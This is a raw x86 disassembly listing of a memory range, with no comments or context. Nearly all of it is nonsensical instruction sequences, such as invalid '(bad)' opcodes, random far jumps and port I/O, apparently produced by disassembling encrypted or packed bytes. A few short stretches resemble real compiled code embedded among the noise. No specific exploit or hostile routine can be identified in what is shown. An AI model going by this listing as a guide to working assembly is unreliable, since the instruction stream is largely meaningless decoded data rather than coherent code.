  410bc5:	xor    al,0xc0
  410bc7:	mov    al,ah
  410bc9:	daa    
  410bca:	sub    cl,BYTE PTR es:[esi+0x167ef97c]
  410bd1:	rcr    DWORD PTR [edx-0x2e],cl
  410bd4:	mov    edi,0x1c150bfe
  410bd9:	in     al,0x5d
  410bdb:	loopne 0x410bff
  410bdd:	aam    0x9d
  410bdf:	retf   0xe89f
  410be2:	fcomp  QWORD PTR [ecx+0x7298977e]
  410be8:	call   0xc25ad534
  410bed:	pop    ecx
  410bee:	or     edx,DWORD PTR [ebx]
  410bf0:	adc    eax,0x570b28e8
  410bf5:	cmp    al,0xbd
  410bf7:	inc    eax
  410bf8:	js     0x410c54
  410bfa:	mov    ah,0xc
  410bfc:	add    al,0x77
  410bfe:	inc    ecx
  410bff:	jle    0x410c15
  410c01:	(bad)  
  410c02:	mov    dh,0x2f
  410c04:	jg     0x410c56
  410c06:	sbb    edx,DWORD PTR [ebx+0x67]
  410c09:	sbb    esi,ebp
  410c0b:	lods   eax,DWORD PTR ds:[esi]
  410c0c:	add    BYTE PTR [edx-0x1017401d],dh
  410c12:	gs jmp 0xd7600f56
  410c18:	pop    eax
  410c19:	fwait
  410c1a:	bound  ebx,QWORD PTR [esi+0x269b7552]
  410c20:	repnz mov ds:0x751fb671,al
  410c26:	adc    eax,0x174c06d1
  410c2b:	sub    eax,0x4b1ca813
  410c30:	add    DWORD PTR [ebp+0x1],0xdaed3d79
  410c37:	fst    DWORD PTR [edx]
  410c39:	or     bh,bl
  410c3b:	(bad)  
  410c3c:	repz aaa 
  410c3e:	cmp    DWORD PTR [edi-0x3c],edi
  410c41:	push   cs
  410c42:	stc    
  410c43:	pop    esp
  410c44:	add    edi,DWORD PTR [ebx+0xc]
  410c47:	call   0xbfbcce3a
  410c4c:	out    0x50,eax
  410c4e:	push   ecx
  410c4f:	pop    edi
  410c50:	mov    bh,0x14
  410c52:	mov    bh,0x8e
  410c54:	mov    WORD PTR [ebx-0x3ec88d87],?
  410c5a:	push   ebp
  410c5b:	jnp    0x410ca0
  410c5d:	ds pushf 
  410c5f:	adc    BYTE PTR [eax+0x17],0x4f
  410c63:	xchg   esi,eax
  410c64:	sahf   
  410c65:	push   ss
  410c66:	in     al,0x46
  410c68:	out    0xe2,al
  410c6a:	imul   edi,DWORD PTR [edi],0x13
  410c6d:	or     DWORD PTR [eax+0x6b],0x71
  410c71:	sub    ebx,DWORD PTR [edx+0x4eeaed6]
  410c77:	cmc    
  410c78:	mov    edx,0x9beeb3d5
  410c7d:	and    BYTE PTR ds:0xbc4d4e3f,0xf7
  410c84:	dec    esp
  410c85:	fwait
  410c86:	mov    ch,0xc6
  410c88:	sar    DWORD PTR [ebp-0x27],0xaa
  410c8c:	inc    esi
  410c8d:	or     edx,DWORD PTR [ebx-0x44]
  410c90:	inc    ecx
  410c91:	enter  0x7b62,0xf3
  410c95:	rcl    BYTE PTR [eax],1
  410c97:	(bad)  
  410c98:	icebp  
  410c99:	stos   DWORD PTR es:[edi],eax
  410c9a:	sbb    bh,BYTE PTR [ebx]
  410c9c:	inc    esi
  410c9d:	and    eax,0x4ee6bb63
  410ca2:	xchg   edx,eax
  410ca3:	or     eax,0x653bee37
  410ca8:	mov    ds:0x1fdc7c91,al
  410cad:	rol    BYTE PTR [edx-0x3824456b],1
  410cb3:	loope  0x410cc5
  410cb5:	not    bl
  410cb7:	es leave 
  410cb9:	imul   BYTE PTR [edi]
  410cbb:	in     eax,0x60
  410cbd:	cmc    
  410cbe:	ds test al,0xa9
  410cc1:	adc    dl,ah
  410cc3:	inc    esi
  410cc4:	(bad)  
  410cc5:	(bad)  
  410cc6:	stc    
  410cc7:	jb     0x410c7f
  410cc9:	add    BYTE PTR gs:[ebx+0x76ea6447],0x1c
  410cd1:	push   ds
  410cd2:	ret    
  410cd3:	jae    0x410c63
  410cd5:	jmp    0x8ac73a4b
  410cda:	and    BYTE PTR [eax-0x6af0bb0],ah
  410ce0:	xchg   DWORD PTR [ecx+0x1b],ecx
  410ce3:	add    al,BYTE PTR [edi-0x1d383604]
  410ce9:	push   0xffffffd5
  410ceb:	rcr    esp,1
  410ced:	xchg   esp,eax
  410cee:	dec    ebx
  410cef:	fmul   DWORD PTR [eax]
  410cf1:	shrd   DWORD PTR [ecx+0x3d],esi,0x6e
  410cf6:	sbb    ah,dl
  410cf8:	pop    ebx
  410cf9:	jnp    0x410c9a
  410cfb:	push   cs
  410cfc:	xor    DWORD PTR [eax],ecx
  410cfe:	and    edx,DWORD PTR [ecx-0x50c868ec]
  410d04:	nop
  410d05:	push   ss
  410d06:	push   edi
  410d07:	xor    BYTE PTR [esi],ah
  410d09:	repz popf 
  410d0b:	add    DWORD PTR [ecx-0x7ba74fe],ecx
  410d11:	jmp    0x410fdf
  410d16:	je     0x410d40
  410d18:	(bad)  
  410d19:	push   cs
  410d1a:	push   edx
  410d1b:	lock je 0x410d8e
  410d1e:	outs   dx,BYTE PTR ds:[esi]
  410d1f:	dec    ecx
  410d20:	mov    edi,0x3c349e9c
  410d25:	sub    ebx,0xffffffb8
  410d28:	jle    0x410da8
  410d2a:	scas   eax,DWORD PTR es:[edi]
  410d2b:	jl     0x410dab
  410d2d:	jle    0x410d47
  410d2f:	mov    eax,ds:0xd71aa11
  410d34:	mov    DWORD PTR ds:0x6c902e19,ebp
  410d3a:	dec    ebp
  410d3b:	jmp    0x9d05:0xc935c0c9
  410d42:	outs   dx,BYTE PTR ds:[esi]
  410d43:	xor    BYTE PTR [eax-0x450faf7d],0xbd
  410d4a:	sub    DWORD PTR [ebp-0x40],0x3
  410d4e:	sub    DWORD PTR ds:0x2130e6b1,0x8b673394
  410d58:	adc    al,0x5f
  410d5a:	inc    esi
  410d5b:	les    ebx,FWORD PTR [edi]
  410d5d:	mov    esi,0x7a6b2202
  410d62:	or     DWORD PTR [ecx+0x59f0865e],edi
  410d68:	inc    esi
  410d69:	ins    BYTE PTR es:[edi],dx
  410d6a:	mov    cl,0x7f
  410d6c:	mov    cl,0xb9
  410d6e:	fstp   TBYTE PTR [ecx+eiz*4+0x5d]
  410d72:	add    dl,BYTE PTR [edx+0x490bfe0c]
  410d78:	aam    0xdc
  410d7a:	xchg   esi,eax
  410d7b:	mov    BYTE PTR [ecx],cl
  410d7d:	xchg   esp,eax
  410d7e:	dec    eax
  410d7f:	push   ecx
  410d80:	call   0x6bd4:0xadb15459
  410d87:	cmp    DWORD PTR [ebx-0x7d9af0b5],0x4b
  410d8e:	js     0x410dd5
  410d90:	out    dx,eax
  410d91:	sbb    al,0xa3
  410d93:	retf   0x7361
  410d96:	inc    ebx
  410d97:	lods   eax,DWORD PTR ds:[esi]
  410d98:	cli    
  410d99:	leave  
  410d9a:	dec    edx
  410d9b:	mov    ah,0xe5
  410d9d:	xchg   ecx,eax
  410d9e:	add    al,BYTE PTR [ecx]
  410da0:	jecxz  0x410ded
  410da2:	push   esi
  410da3:	clc    
  410da4:	push   ds
  410da5:	mov    ds:0x6c5e5341,al
  410daa:	(bad)  
  410dac:	pop    ebp
  410dad:	inc    esp
  410dae:	jns    0x410d7a
  410db0:	hlt    
  410db1:	in     eax,dx
  410db2:	dec    edx
  410db3:	jecxz  0x410d8a
  410db5:	hlt    
  410db6:	sub    DWORD PTR [eax+0x2e08f6b],ebp
  410dbc:	push   edi
  410dbd:	dec    edi
  410dbe:	pop    ds
  410dbf:	pop    ebx
  410dc0:	je     0x410de5
  410dc2:	xchg   esi,eax
  410dc3:	icebp  
  410dc4:	in     eax,0xcd
  410dc6:	mov    ah,0x70
  410dc8:	inc    esp
  410dc9:	lock cmp al,0x29
  410dcc:	pushf  
  410dcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410dce:	dec    dl
  410dd0:	pusha  
  410dd1:	mov    esp,0xd3ba3a60
  410dd6:	inc    ebx
  410dd7:	fs inc esi
  410dd9:	pop    es
  410dda:	ins    DWORD PTR es:[edi],dx
  410ddb:	dec    esi
  410ddc:	mov    bh,BYTE PTR [ecx+0x6b]
  410ddf:	dec    esi
  410de0:	stos   BYTE PTR es:[edi],al
  410de1:	sti    
  410de2:	call   0x674b:0x40774cde
  410de9:	pusha  
  410dea:	adc    DWORD PTR [ebx],ecx
  410dec:	int3   
  410ded:	stos   DWORD PTR es:[edi],eax
  410dee:	lock adc dh,BYTE PTR [ebx+ecx*2+0x67]
  410df3:	rcr    DWORD PTR [ecx-0x72680403],cl
  410df9:	inc    ecx
  410dfa:	mov    dh,0x56
  410dfc:	adc    al,dl
  410dfe:	xchg   esp,eax
  410dff:	in     al,dx
  410e00:	adc    eax,0xfbd9f3b3
  410e05:	xor    eax,0x823525de
  410e0a:	and    eax,0x4aa45389
  410e0f:	out    dx,eax
  410e10:	aaa    
  410e11:	or     eax,DWORD PTR [edi+0x7ea51eec]
  410e17:	or     dl,dl
  410e19:	repnz test eax,0x559c5685
  410e1f:	or     eax,0xc5331fc6
  410e24:	shl    BYTE PTR [esi-0x108ab2f1],1
  410e2a:	mov    ebx,0x8a8ff493
  410e2f:	in     al,dx
  410e30:	inc    edi
  410e31:	pop    ds
  410e32:	mov    ebp,0x6d6f3c50
  410e37:	xchg   ebx,eax
  410e38:	lea    esi,[ebp+0x6d611ef0]
  410e3e:	mov    eax,ds:0xb56b980a
  410e43:	(bad)  
  410e44:	mov    cl,0xa5
  410e46:	xchg   DWORD PTR [esi+eiz*8+0x8],edx
  410e4a:	ret    0xa56f
  410e4d:	fidiv  DWORD PTR [edx+0x7d]
  410e50:	pop    edi
  410e51:	push   ecx
  410e52:	sti    
  410e53:	inc    ecx
  410e54:	cld    
  410e55:	div    BYTE PTR ds:0x5228d4e7
  410e5b:	cmp    ecx,ecx
  410e5d:	lods   al,BYTE PTR ds:[esi]
  410e5e:	sbb    al,BYTE PTR [esi+ecx*4]
  410e61:	pop    edx
  410e62:	repnz shl BYTE PTR [ecx-0x39],1
  410e66:	ds popa 
  410e68:	ret    0xaf98
  410e6b:	pop    esp
  410e6c:	cld    
  410e6d:	out    0xa,al
  410e6f:	out    0xdf,al
  410e71:	mov    esi,0xf04621d2
  410e76:	ins    DWORD PTR es:[edi],dx
  410e77:	loopne 0x410e26
  410e79:	sub    BYTE PTR [edi-0x72],ah
  410e7c:	rcr    ebp,cl
  410e7e:	pop    ebp
  410e7f:	paddusb mm6,QWORD PTR [ebp+0x3ae137df]
  410e86:	cmp    bl,BYTE PTR [esi+0x41c4bc0a]
  410e8c:	cmp    al,BYTE PTR [ecx-0x6ed4045b]
  410e92:	aam    0x2c
  410e94:	add    eax,0x6b8e7bad
  410e99:	mov    dl,0xe6
  410e9b:	add    al,0xd4
  410e9d:	xor    bl,BYTE PTR [esi]
  410e9f:	repnz in al,dx
  410ea1:	test   ebp,0x6bb7a108
  410ea7:	add    BYTE PTR [edx],al
  410ea9:	cs pop eax
  410eab:	xchg   BYTE PTR [ecx-0x848d860],ah
  410eb1:	out    dx,eax
  410eb2:	mov    ds:0xbc04975f,al
  410eb7:	fld    QWORD PTR es:[eax-0x61]
  410ebb:	and    edx,ebp
  410ebd:	inc    ebx
  410ebe:	in     eax,0x95
  410ec0:	retf   
  410ec1:	(bad)  
  410ec2:	mov    esi,0x8e6bf0fd
  410ec7:	enter  0xb693,0xa
  410ecb:	rcr    DWORD PTR [ecx+edi*4-0x46],cl
  410ecf:	and    al,0x31
  410ed1:	dec    eax
  410ed2:	or     BYTE PTR [ecx-0x37],al
  410ed5:	mov    dh,0xb3
  410ed7:	leave  
  410ed8:	test   eax,0x9fc69778
  410edd:	xor    eax,0x2a48523e
  410ee2:	cmc    
  410ee3:	(bad)  
  410ee4:	js     0x410f12
  410ee6:	jns    0x410f1c
  410ee8:	adc    dh,BYTE PTR [ecx-0x5c]
  410eeb:	push   esp
  410eec:	test   DWORD PTR [ebx+0x21c53d38],ebp
  410ef2:	sti    
  410ef3:	ficomp DWORD PTR [edi-0x70650ba1]
  410ef9:	cld    
  410efa:	push   ebp
  410efb:	add    esi,eax
  410efd:	fdiv   QWORD PTR [ebx]
  410eff:	(bad)  
  410f01:	jecxz  0x410f45
  410f03:	sub    eax,0xd92f378c
  410f08:	out    0x9c,eax
  410f0a:	cli    
  410f0b:	test   DWORD PTR [eax+0x5b],ebx
  410f0e:	xor    eax,0x7edea62
  410f13:	inc    ebp
  410f14:	aad    0xdc
  410f16:	adc    ch,BYTE PTR ds:0x8fa7db9f
  410f1c:	inc    esi
  410f1d:	lods   eax,DWORD PTR ds:[esi]
  410f1e:	rol    esp,1
  410f20:	je     0x410f5c
  410f22:	stos   DWORD PTR es:[edi],eax
  410f23:	mov    ebp,0xbc46a44c
  410f28:	or     WORD PTR [ecx-0x77f040f6],cx
  410f2f:	inc    edi
  410f30:	int    0x68
  410f32:	mov    al,ds:0xc72451f7
  410f37:	push   eax
  410f38:	mov    edi,0xe387815b
  410f3d:	shl    edi,0xc4
  410f40:	call   0x30597b0
  410f45:	cmp    DWORD PTR [ebx-0xd],0xffffff9b
  410f49:	mov    ds:0x71f1f2c7,eax
  410f4e:	pusha  
  410f4f:	cmp    edi,eax
  410f51:	int    0xa9
  410f53:	rcl    DWORD PTR [esi+0x1f],cl
  410f56:	add    eax,0x657cc7a8
  410f5b:	data16 mov dh,0x78
  410f5e:	loop   0x410f79
  410f60:	aad    0xd1
  410f62:	stos   BYTE PTR es:[edi],al
  410f63:	adc    eax,0xaf741046
  410f68:	push   esp
  410f69:	adc    eax,0xad106964
  410f6e:	sub    bh,ah
  410f70:	ds pop ebp
  410f72:	mov    edi,0x1e0e86df
  410f77:	rcr    BYTE PTR [ebp-0x36],0xa4
  410f7b:	inc    ecx
  410f7c:	aaa    
  410f7d:	inc    esp
  410f7e:	cmc    
  410f7f:	es pushf 
  410f81:	dec    eax
  410f82:	xchg   DWORD PTR [edi],ebx
  410f84:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  410f86:	mov    ds:0xa76e7af4,al
  410f8b:	mov    bl,0x8
  410f8d:	mov    ds:0x6c9db4b0,eax
  410f92:	xchg   ecx,eax
  410f93:	pusha  
  410f94:	xchg   ecx,ebx
  410f96:	jecxz  0x410f48
  410f98:	and    DWORD PTR [esi+0xffbd3dd],ebp
  410f9e:	(bad)  
  410fa0:	lahf   
  410fa1:	jmp    0xbbff:0x53eb8570
  410fa8:	cmp    ch,BYTE PTR [ecx+0x6d]
  410fab:	cmp    ebx,DWORD PTR [ebx+0x3b]
  410fae:	jmp    0xf7bd:0xac47b1df
  410fb5:	mov    ss,WORD PTR [edi-0x42a88410]
  410fbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410fbc:	idiv   DWORD PTR [eax]
  410fbe:	add    DWORD PTR [edi+esi*4-0x2],edi
  410fc2:	push   ebx
  410fc3:	(bad)  
  410fc4:	mov    WORD PTR [edx+0x23ceecf6],gs
  410fca:	cmp    edx,ebx
  410fcc:	loopne 0x41100d
  410fce:	and    ah,BYTE PTR [eax+0x4f173034]
  410fd4:	jmp    0x2f8a:0xbb57a4fe
  410fdb:	mov    ds:0x33d6d944,eax
  410fe0:	rol    DWORD PTR [ebx],0xc6
  410fe3:	mov    DWORD PTR [ebp+0x8],eax
  410fe6:	mov    eax,DWORD PTR [ebp+0x8]
  410fe9:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fed:	mov    dl,BYTE PTR [ebp-0x1]
  410ff0:	cmp    al,dl
  410ff2:	je     0x411303
  410ff8:	mov    eax,DWORD PTR [ebp+0x8]
  410ffb:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fff:	mov    edx,DWORD PTR [ebp+0xc]
  411002:	cmp    al,BYTE PTR [edx]
  411004:	jne    0x4115f7
  41100a:	mov    eax,DWORD PTR [ebp-0x8]
  41100d:	mov    edx,DWORD PTR [ebp+0xc]
  411010:	movsx  edx,BYTE PTR [edx]
  411013:	xor    eax,ecx
  411015:	add    eax,esi
  411017:	cmp    edx,eax
  411019:	jmp    0x4112e7
  41101e:	jmp    0x411054
  411020:	push   esp
  411021:	dec    ebx
  411022:	push   ecx
  411023:	imul   esi,ecx,0xffffffb4
  411026:	and    DWORD PTR [edx-0x16],esi
  411029:	loope  0x4110a9
  41102b:	(bad)  
  41102c:	shl    DWORD PTR [ebx],cl
  41102e:	sbb    BYTE PTR [edi+0x7e],al
  411031:	jle    0x410fe2
  411033:	jl     0x4110b3
  411035:	jle    0x411054
  411037:	fsubr  DWORD PTR [esi-0x1c154693]
  41103d:	lods   eax,DWORD PTR ds:[esi]
  41103e:	sbb    eax,0x966cc7f0
  411043:	mov    bh,0x47
  411045:	shl    BYTE PTR [esi+0x5899edd5],1
  41104b:	mov    cl,0xfd
  41104d:	pop    ecx
  41104e:	fbld   TBYTE PTR [esi+0x2b]
  411051:	cs jmp 0x411097
  411054:	mov    es,WORD PTR [ecx-0xe]
  411057:	aas    
  411058:	loopne 0x410ffb
  41105a:	adc    cl,BYTE PTR [edi]
  41105c:	inc    ebx
  41105d:	je     0x41108c
  41105f:	inc    esi
  411060:	cwde   
  411061:	pop    es
  411062:	mov    ebx,ds
  411064:	push   ds
  411065:	fs jge 0x411077
  411068:	pop    eax
  411069:	out    dx,al
  41106a:	pop    ebx
  41106b:	(bad)  
  41106c:	lock mov cl,0x2f
  41106f:	sbb    BYTE PTR [ecx+0x3a],0xc1
  411073:	xor    eax,DWORD PTR [ebx]
  411075:	inc    ebx
  411076:	xlat   BYTE PTR ds:[ebx]
  411077:	retf   
  411078:	popa   
  411079:	mov    ch,0x74
  41107b:	sub    al,dh
  41107d:	cwde   
  41107e:	ins    DWORD PTR es:[edi],dx
  41107f:	stos   DWORD PTR es:[edi],eax
  411080:	and    edi,eax
  411082:	mov    ebx,0xe809a3e0
  411087:	arpl   WORD PTR [edx+0x56269a59],di
  41108d:	jb     0x411093
  41108f:	jge    0x4110b8
  411091:	adc    al,0x19
  411093:	bound  esp,QWORD PTR [edi+esi*2]
  411096:	add    al,al
  411098:	jnp    0x4110ad
  41109a:	ficom  WORD PTR [eax-0x70]
  41109d:	jle    0x41105b
  41109f:	call   0x10c2be10
  4110a4:	xchg   ebx,eax
  4110a5:	popa   
  4110a6:	jmp    0xd658:0x6485688c
  4110ad:	rcl    DWORD PTR [edx-0x1d356689],0x3c
  4110b4:	addr16 mov ebp,0x2535cb51
  4110ba:	xchg   BYTE PTR [esp+eiz*8],ah
  4110bd:	and    esi,DWORD PTR [ebx-0x16]
  4110c0:	adc    esp,edx
  4110c2:	mov    al,0xfc
  4110c4:	data16 jns 0x411084
  4110c7:	cwde   
  4110c8:	jge    0x4110fe
  4110ca:	cmp    DWORD PTR [eax+0x26ea9157],0xffffff8b
  4110d1:	dec    ecx
  4110d2:	pop    ds
  4110d3:	cmp    eax,0x4a04938f
  4110d8:	push   ebx
  4110d9:	stos   DWORD PTR es:[edi],eax
  4110da:	aas    
  4110db:	jecxz  0x41114e
  4110dd:	mov    esp,0xf7ae47e2
  4110e2:	aam    0xa4
  4110e4:	jg     0x411155
  4110e6:	or     al,0x46
  4110e8:	or     BYTE PTR [edi+0x5747faad],0x49
  4110ef:	test   al,0x7b
  4110f1:	adc    al,0xeb
  4110f3:	pusha  
  4110f4:	dec    ebp
  4110f5:	mov    dh,dl
  4110f7:	jb     0x4110d1
  4110f9:	inc    eax
  4110fa:	sti    
  4110fb:	and    eax,0xc6316467
  411100:	fpatan 
  411102:	enter  0xb8b2,0x92
  411106:	imul   ebp,edi,0x52
  411109:	push   0x36
  41110b:	lea    esp,[eax-0x6c]
  41110e:	(bad)  
  41110f:	retf   
  411110:	adc    esp,DWORD PTR [eax]
  411112:	jl     0x41116c
  411114:	push   es
  411115:	dec    ebx
  411116:	test   DWORD PTR [ebx+0x7d],ebx
  411119:	ret    0x5da7
  41111c:	adc    DWORD PTR [esp+ebx*1+0x37],esi
  411120:	cwde   
  411121:	sbb    al,0xa2
  411123:	mov    ds:0xebef9ce1,al
  411128:	mul    BYTE PTR [ebp+0x35a888b7]
  41112e:	pop    ecx
  41112f:	(bad)  
  411130:	jmp    0xa59b7e3d
  411135:	add    al,0xaa
  411137:	xor    DWORD PTR [ebx-0x2d93964b],esp
  41113d:	xchg   ah,ch
  41113f:	pop    ds
  411140:	scas   al,BYTE PTR es:[edi]
  411141:	lahf   
  411142:	add    cl,BYTE PTR [ecx]
  411144:	or     al,0xc7
  411146:	(bad)  
  411148:	cmp    ah,dl
  41114a:	adc    eax,0xb68adc79
  41114f:	pop    ds
  411150:	xor    BYTE PTR [esi],0x58
  411153:	mov    edx,0x1b18d9aa
  411158:	add    BYTE PTR [eax+ebp*8+0x132f46dc],bh
  41115f:	push   cs
  411160:	aas    
  411161:	retf   
  411162:	jnp    0x4111b5
  411164:	add    DWORD PTR [ecx],0xc1be5ef5
  41116a:	(bad)  
  41116b:	dec    esp
  41116c:	mov    bl,0xaf
  41116e:	add    ecx,DWORD PTR [edx+0x697beb0c]
  411174:	jbe    0x4111cd
  411176:	sbb    eax,0xff14cbba
  41117b:	repz lahf 
  41117d:	lods   al,BYTE PTR ds:[esi]
  41117e:	jl     0x411142
  411180:	bswap  edx
  411182:	xchg   BYTE PTR [ecx-0x152fc050],cl
  411188:	push   es
  411189:	mov    bh,BYTE PTR [edi+0x75]
  41118c:	mov    eax,0x3b1dc539
  411191:	adc    al,0x6d
  411193:	pop    edx
  411194:	and    eax,0xdf9e75e7
  411199:	sar    BYTE PTR [edx-0x69],1
  41119c:	xchg   ebx,eax
  41119d:	aad    0x4e
  41119f:	inc    esp
  4111a0:	xchg   DWORD PTR [eax+0x4d1c9edc],ecx
  4111a6:	mov    eax,0xf9e707bf
  4111ab:	sub    esp,DWORD PTR [ecx-0x474dae8c]
  4111b1:	mov    ecx,0x7428bca8
  4111b6:	sub    dh,BYTE PTR [ebp+0x12]
  4111b9:	stos   DWORD PTR es:[edi],eax
  4111ba:	std    
  4111bb:	iret   
  4111bc:	(bad)  
  4111bd:	pop    ds
  4111be:	mov    edi,0x529cad60
  4111c3:	ss or  al,0x17
  4111c6:	out    0xfe,al
  4111c8:	xlat   BYTE PTR ds:[ebx]
  4111c9:	fisub  WORD PTR [ebx+0x4f5e2907]
  4111cf:	loope  0x4111c2
  4111d1:	sbb    BYTE PTR [ebp+0x22d26ad6],cl
  4111d7:	leave  
  4111d8:	push   ds
  4111d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111da:	and    BYTE PTR [esp+ecx*8],dl
  4111dd:	cmp    BYTE PTR [ebp+ebx*2-0x7b],0x64
  4111e2:	adc    ebp,ecx
  4111e4:	push   cs
  4111e5:	inc    ebx
  4111e6:	push   edi
  4111e7:	sbb    al,0x8e
  4111e9:	js     0x411229
  4111eb:	cdq    
  4111ec:	pop    ss
  4111ed:	ss lahf 
  4111ef:	imul   ecx,ecx,0xbfe7f273
  4111f5:	lds    ebx,FWORD PTR [eax]
  4111f7:	push   ebx
  4111f8:	xlat   BYTE PTR ds:[ebx]
  4111f9:	add    DWORD PTR ds:0x32809c1,0xf
  411200:	mov    WORD PTR [ebx+0x58],ss
  411203:	jmp    0xf34ae044
  411208:	push   esi
  411209:	fnstenv [bx+di]
  41120c:	arpl   WORD PTR [edi+0x73],bx
  41120f:	(bad)  
  411210:	mov    ecx,0xb1afae6f
  411215:	pop    ds
  411216:	push   eax
  411217:	xchg   ebx,eax
  411218:	std    
  411219:	(bad)  
  41121a:	(bad)  
  41121c:	adc    BYTE PTR [edi-0x4c],bl
  41121f:	into   
  411220:	and    DWORD PTR [ebp-0x5],edi
  411223:	push   es
  411224:	push   esi
  411225:	dec    ebp
  411226:	imul   edi,DWORD PTR [ebp-0x59],0xffffffea
  41122a:	ficomp WORD PTR [ebx+0x3694a0d]
  411230:	jbe    0x41121c
  411232:	cmp    al,0xf
  411234:	mov    dl,0xca
  411236:	dec    edx
  411237:	xchg   BYTE PTR ds:0x8574673d,cl
  41123d:	mov    ds:0x29889774,eax
  411242:	dec    ebp
  411243:	cli    
  411244:	push   0xffffffc6
  411246:	ja     0x411202
  411248:	jbe    0x4111f0
  41124a:	mov    edx,0x218b57d1
  41124f:	scas   eax,DWORD PTR es:[edi]
  411250:	adc    eax,0x175755d5
  411255:	inc    edi
  411256:	scas   al,BYTE PTR es:[edi]
  411257:	ins    BYTE PTR es:[edi],dx
  411258:	sub    esi,DWORD PTR [edx]
  41125a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41125b:	push   esp
  41125c:	or     esi,edi
  41125e:	imul   ebp,DWORD PTR [eax+0x18309ee4],0xffffff8e
  411265:	xchg   esi,eax
  411266:	jbe    0x41120f
  411268:	fdiv   DWORD PTR [ebp-0x6a]
  41126b:	sbb    bh,ah
  41126d:	test   eax,0x8f1ad9ba
  411272:	(bad)  
  411273:	lods   eax,DWORD PTR ds:[esi]
  411274:	sub    ch,BYTE PTR [esi+0x2a]
  411277:	sti    
  411278:	ret    0xa8a4
  41127b:	and    ecx,DWORD PTR [eax+ebx*4]
  41127e:	scas   eax,DWORD PTR es:[edi]
  41127f:	or     al,0x62
  411281:	mov    ds:0xf35ab4c4,eax
  411286:	mov    ?,WORD PTR [edx-0x6c3eef5f]
  41128c:	stc    
  41128d:	ins    DWORD PTR es:[edi],dx
  41128e:	cld    
  41128f:	sar    BYTE PTR [edi-0x4354f2d7],0x3
  411296:	jp     0x4112c5
  411298:	push   ecx
  411299:	xlat   BYTE PTR ds:[ebx]
  41129a:	xchg   esi,eax
  41129b:	xchg   BYTE PTR [ebx+0x22443913],al
  4112a1:	sub    ecx,DWORD PTR [esp+ebx*4-0x2]
  4112a5:	call   0x9bfa3d46
  4112aa:	repz imul ebx,DWORD PTR [ebp+0x5155d2],0x357b9130
  4112b5:	push   es
  4112b6:	das    
  4112b7:	xor    bl,BYTE PTR [ebp+0x5e]
  4112ba:	jge    0x411257
  4112bc:	dec    DWORD PTR [eax]
  4112be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112bf:	lds    esp,FWORD PTR [ebp+0x271c7c34]
  4112c5:	arpl   WORD PTR [eax-0x66],bp
  4112c8:	push   ss
  4112c9:	dec    esp
  4112ca:	pusha  
  4112cb:	(bad)
  4112d0:	pushf  
  4112d1:	and    eax,DWORD PTR [edx+0x7b]
  4112d4:	mov    ch,0x4c
  4112d6:	js     0x411305
  4112d8:	mov    edx,0x5cc850ad
  4112dd:	push   0xffffff98
  4112df:	popa   
  4112e0:	aas    
  4112e1:	adc    bl,cl
  4112e3:	hlt    
  4112e4:	(bad)  
  4112e6:	sbb    DWORD PTR [edi],ecx
  4112e8:	test   dh,bh
  4112ea:	add    al,BYTE PTR [eax]
  4112ec:	add    bh,al
  4112ee:	inc    ebp
  4112ef:	call   0x7471083
  4112f4:	lea    eax,[ebp-0x18]
  4112f7:	mov    DWORD PTR [ebp-0x14],eax
  4112fa:	mov    eax,DWORD PTR [ebp-0x14]
  4112fd:	add    DWORD PTR [eax],0x705fa8f
  411303:	mov    eax,DWORD PTR [ebp-0x10]
  411306:	jmp    0x4115d4
  41130b:	sub    al,0xc2
  41130d:	or     al,0xb3
  41130f:	lock jno 0x4112c3
  411312:	inc    ecx
  411313:	mov    ds:0x168f61e,eax
  411318:	sbb    ebp,DWORD PTR [edx]
  41131a:	das    
  41131b:	dec    ecx
  41131c:	inc    ebp
  41131d:	jle    0x41139d
  41131f:	scas   eax,DWORD PTR es:[edi]
  411320:	jl     0x4113a0
  411322:	jle    0x411363
  411324:	push   esi
  411325:	mov    ebx,0x85befb0e
  41132a:	push   esp
  41132b:	and    DWORD PTR [ecx],esp
  41132d:	ret    0x39e7
  411330:	scas   eax,DWORD PTR es:[edi]
  411331:	push   ecx
  411332:	jmp    0xc9c4e745
  411337:	dec    dh
  411339:	int3   
  41133a:	add    al,0x32
  41133c:	gs mov esi,0x68128689
  411342:	sub    eax,0x96d5cdf5
  411347:	jns    0x411395
  411349:	add    ah,BYTE PTR [ecx+esi*8+0x600a95e]
  411350:	retf   0xcb43
  411353:	fcom   QWORD PTR [edi]
  411355:	imul   esi,DWORD PTR [eax+edi*2+0x7480980a],0xce66c8cb
  411360:	inc    edx
  411361:	and    bl,cl
  411363:	shl    BYTE PTR [ebx],0x24
  411366:	sbb    dl,BYTE PTR [edi-0x6f]
  411369:	cmp    eax,0x3af00cfa
  41136e:	cmp    DWORD PTR [ebp+eiz*2-0xcfd3cf7],ecx
  411375:	dec    esp
  411376:	pop    ebp
  411377:	dec    ecx
  411378:	mov    dl,0x25
  41137a:	(bad)  
  41137b:	fdivr  QWORD PTR [esi+0x28]
  41137e:	add    DWORD PTR [edi-0x58d4064c],ebp
  411384:	sub    al,0x48
  411386:	pop    esi
  411387:	jo     0x41133f
  411389:	imul   ebp,DWORD PTR [ebx+edi*4],0xffffffdb
  41138d:	mov    eax,cs
  41138f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411390:	adc    esp,edx
  411392:	(bad)  
  411394:	and    DWORD PTR [esi+edx*1],0xffffff85
  411398:	inc    edi
  411399:	mov    bl,0x99
  41139b:	mov    ebx,0x21a4ecc0
  4113a0:	xor    al,0x8f
  4113a2:	outs   dx,DWORD PTR ds:[esi]
  4113a3:	in     eax,dx
  4113a4:	leave  
  4113a5:	add    dh,BYTE PTR [esi+ecx*2+0x48d1b8c4]
  4113ac:	shl    al,0x28
  4113af:	(bad)  
  4113b0:	and    eax,0x10396945
  4113b5:	adc    DWORD PTR [edi+eax*4+0xd4fcd7a],ecx
  4113bc:	test   al,0xb5
  4113be:	or     eax,0x4c9747bc
  4113c3:	inc    ebx
  4113c4:	stos   BYTE PTR es:[edi],al
  4113c5:	test   eax,0x88cfdb02
  4113ca:	jbe    0x41138a
